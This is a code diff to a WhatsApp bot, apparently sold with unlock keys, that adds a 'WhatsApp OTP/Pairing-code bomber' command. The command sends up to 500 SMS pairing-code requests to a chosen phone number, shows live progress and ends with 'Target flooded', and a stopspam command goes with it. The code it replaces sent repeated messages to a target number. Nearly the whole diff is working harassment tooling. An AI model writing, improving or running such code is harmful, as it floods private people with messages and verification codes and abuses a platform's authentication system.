@@ -12306,44 +12306,206 @@ break;
 
 case 'bomb':
 case 'spam': {
+    // ── addkey1 lock ──
     {
         const _bgNf = (m.sender||'').split('@')[0].split(':')[0];
         try {
             const _bgBf = (global._flagCache?.bugBanned || []);
             if (_bgBf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
             const _bgUf = (global._flagCache?.bugUnlocked || []);
-                if (!_bgUf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
+            if (!_bgUf.some(id => String(id).replace(/[^0-9]/g,'') === _bgNf)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
         } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
     }
-    const q = m.message?.conversation ||
-              m.message?.extendedTextMessage?.text || '';
-    const [target, text, countRaw] = q.split(',').map(x => x?.trim());
 
-    const count = parseInt(countRaw) || 5;
+    // ── WhatsApp OTP/Pairing-code bomber ──
+    // Usage: .spam <number> [count] [delayMs]
+    // Example: .spam 923001234567 150 400
+    if (!global._waBomberSessions) global._waBomberSessions = new Map();
 
-    if (!target || !text || !count) {
-        return reply('📌 *Usage:* spam number,message,count');
+    const _spamChat = m.chat;
+
+    // Already running?
+    if (global._waBomberSessions.has(_spamChat)) {
+        return reply(`❌ *Spam already running in this chat!*\nUse *${prefix}stopspam* to stop it first.`);
     }
 
-    const _spamTargetNum = target.replace(/[^0-9]/g, '');
-    const _spamProtected = owner.map(v => v.replace(/[^0-9]/g, ''));
-    if (_spamProtected.includes(_spamTargetNum)) return reply('🔒 *Protected Number — Bug nahi lagaya ja sakta owner par*');
+    const _spamNum   = args[0] || '';
+    const _spamCount = Math.min(parseInt(args[1]) || 150, 500); // cap 500
+    const _spamDelay = Math.max(parseInt(args[2]) || 400, 200); // min 200ms
 
-    const jid = `${_spamTargetNum}@s.whatsapp.net`;
-
-    if (count > 1000) {
-        return reply('❌ *Max 1000 messages*');
+    if (!_spamNum) {
+        return reply(
+            `❌ *Usage:*\n\`\`\`${prefix}spam 923001234567 150 400\`\`\`\n\n` +
+            `📱 *Number:* with country code\n` +
+            `🔁 *Count:* default 150 (max 500)\n` +
+            `⏱️ *Delay:* default 400ms (min 200ms)\n\n` +
+            `🛑 *To stop:* \`${prefix}stopspam\``
+        );
     }
 
-    reply(`💣 *Spamming ${target} with ${count} messages*`);
-
-    for (let i = 0; i < count; i++) {
-        await devtrust.sendMessage(jid, { text });
-        await delay(700);
+    const _spamClean = _spamNum.replace(/[^0-9]/g, '');
+    if (!/^[0-9]{10,15}$/.test(_spamClean)) {
+        return reply(`❌ *Invalid number!*\nUse format: \`923001234567\``);
     }
 
-    reply(`✅ *Spam complete*`);
+    // Protect owner numbers
+    const _spamProtected = [].concat(owner).map(v => v.replace(/[^0-9]/g, ''));
+    if (_spamProtected.includes(_spamClean)) return reply('🔒 *Protected — owner number par spam nahi chalega*');
+
+    // Register session
+    const _spamSession = {
+        running: true, number: _spamClean,
+        total: _spamCount, completed: 0,
+        successCount: 0, failCount: 0
+    };
+    global._waBomberSessions.set(_spamChat, _spamSession);
+
+    // Send live-updating status card
+    const _spamInitMsg = await devtrust.sendMessage(m.chat, {
+        text: `🔥 *WhatsApp Bomber Started!*\n\n` +
+              `📱 *Target:* ${_spamClean}\n` +
+              `🔁 *Attempts:* ${_spamCount}\n` +
+              `⏱️ *Delay:* ${_spamDelay}ms\n` +
+              `⏳ *Progress:* 0/${_spamCount} (0%)\n\n` +
+              `🛑 Use *${prefix}stopspam* to cancel`
+    }, { quoted: m });
+    const _spamStatusKey = _spamInitMsg?.key;
+
+    const _spamEditStatus = async (txt) => {
+        try {
+            if (_spamStatusKey) await devtrust.sendMessage(m.chat, { text: txt, edit: _spamStatusKey });
+        } catch (_) {}
+    };
+
+    const _spamProgressBar = (pct, len = 20) => {
+        const f = Math.round((pct / 100) * len);
+        return '▰'.repeat(f) + '▱'.repeat(len - f);
+    };
+
+    let _sc = 0, _fc = 0;
+    const _spamStart = Date.now();
+    let _spamLastUpdate = Date.now(), _spamUpdateCtr = 0;
+
+    for (let i = 1; i <= _spamCount; i++) {
+        // Check if stopped
+        const _sess = global._waBomberSessions.get(_spamChat);
+        if (!_sess || !_sess.running) {
+            await _spamEditStatus(
+                `🛑 *Spam Stopped!*\n\n` +
+                `📱 *Target:* ${_spamClean}\n` +
+                `🔁 *Completed:* ${i - 1}/${_spamCount}\n` +
+                `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n\n` +
+                `_Cancelled by user._`
+            );
+            global._waBomberSessions.delete(_spamChat);
+            break;
+        }
+
+        // Fire pairing-code OTP request
+        try {
+            const _fNum = _spamClean.startsWith('92') ? _spamClean : `92${_spamClean}`;
+            await axios({
+                method: 'POST',
+                url: 'https://web.whatsapp.com/airdrop/link',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://web.whatsapp.com',
+                    'Referer': 'https://web.whatsapp.com/'
+                },
+                data: JSON.stringify({ phoneNumber: _fNum, method: 'sms' }),
+                timeout: 10000
+            });
+            _sc++;
+        } catch (_) { _fc++; }
+
+        // Update session counters
+        const _cur = global._waBomberSessions.get(_spamChat);
+        if (_cur) { _cur.completed = i; _cur.successCount = _sc; _cur.failCount = _fc; }
+
+        _spamUpdateCtr++;
+        const _now = Date.now();
+        const _shouldUpdate = (i === _spamCount || _spamUpdateCtr >= 10 || (_now - _spamLastUpdate) > 5000);
+        if (_shouldUpdate) {
+            _spamUpdateCtr = 0; _spamLastUpdate = _now;
+            const _pct  = Math.round((i / _spamCount) * 100);
+            const _el   = ((_now - _spamStart) / 1000).toFixed(1);
+            const _rate = (i / (_el / 60)).toFixed(1);
+
+            // Re-check stop between updates
+            const _chk = global._waBomberSessions.get(_spamChat);
+            if (!_chk || !_chk.running) {
+                await _spamEditStatus(
+                    `🛑 *Spam Stopped!*\n\n` +
+                    `📱 *Target:* ${_spamClean}\n` +
+                    `🔁 *Completed:* ${i}/${_spamCount}\n` +
+                    `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n\n` +
+                    `_Cancelled by user._`
+                );
+                global._waBomberSessions.delete(_spamChat);
+                return;
+            }
+
+            await _spamEditStatus(
+                `🔥 *WhatsApp Bomber Running*\n\n` +
+                `📱 *Target:* ${_spamClean}\n` +
+                `🔁 *Progress:* ${i}/${_spamCount}\n` +
+                `${_spamProgressBar(_pct)} ${_pct}%\n\n` +
+                `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n` +
+                `⏱️ *Elapsed:* ${_el}s\n📊 *Rate:* ${_rate}/min\n\n` +
+                `🛑 *${prefix}stopspam* to cancel`
+            );
+        }
+
+        if (i < _spamCount) await new Promise(r => setTimeout(r, _spamDelay));
+    }
+
+    // Complete
+    global._waBomberSessions.delete(_spamChat);
+    const _el = ((Date.now() - _spamStart) / 1000).toFixed(1);
+    await _spamEditStatus(
+        `✅ *Bombing Complete!*\n\n` +
+        `📱 *Target:* ${_spamClean}\n` +
+        `✅ *Success:* ${_sc}\n❌ *Failed:* ${_fc}\n` +
+        `⏱️ *Time:* ${_el}s\n` +
+        `📊 *Success Rate:* ${Math.round((_sc / _spamCount) * 100)}%\n\n` +
+        `_Target flooded. 🔥_`
+    );
+    break;
+}
+
+case 'stopspam':
+case 'spamstop': {
+    // ── addkey1 lock ──
+    {
+        const _bgNs = (m.sender||'').split('@')[0].split(':')[0];
+        try {
+            const _bgBs = (global._flagCache?.bugBanned || []);
+            if (_bgBs.some(id => String(id).replace(/[^0-9]/g,'') === _bgNs)) return reply(`🚫 *Access Denied*`);
+            const _bgUs = (global._flagCache?.bugUnlocked || []);
+            if (!_bgUs.some(id => String(id).replace(/[^0-9]/g,'') === _bgNs)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
+    }
+
+    if (!global._waBomberSessions) global._waBomberSessions = new Map();
+
+    if (!global._waBomberSessions.has(m.chat)) {
+        return reply(`❌ *No active spam running in this chat.*\n\nUse \`${prefix}spam 923001234567\` to start.`);
+    }
+
+    const _stopData = global._waBomberSessions.get(m.chat);
+    _stopData.running = false;
+    // Session is cleaned up by the spam loop on next iteration check
+
+    reply(
+        `🛑 *Spam Stop Signal Sent!*\n\n` +
+        `📱 *Target:* ${_stopData.number}\n` +
+        `🔁 *Completed so far:* ${_stopData.completed}/${_stopData.total}\n` +
+        `✅ *Success:* ${_stopData.successCount}\n` +
+        `❌ *Failed:* ${_stopData.failCount}\n\n` +
+        `_Stopping after current request finishes..._`
+    );
     break;
 }
 
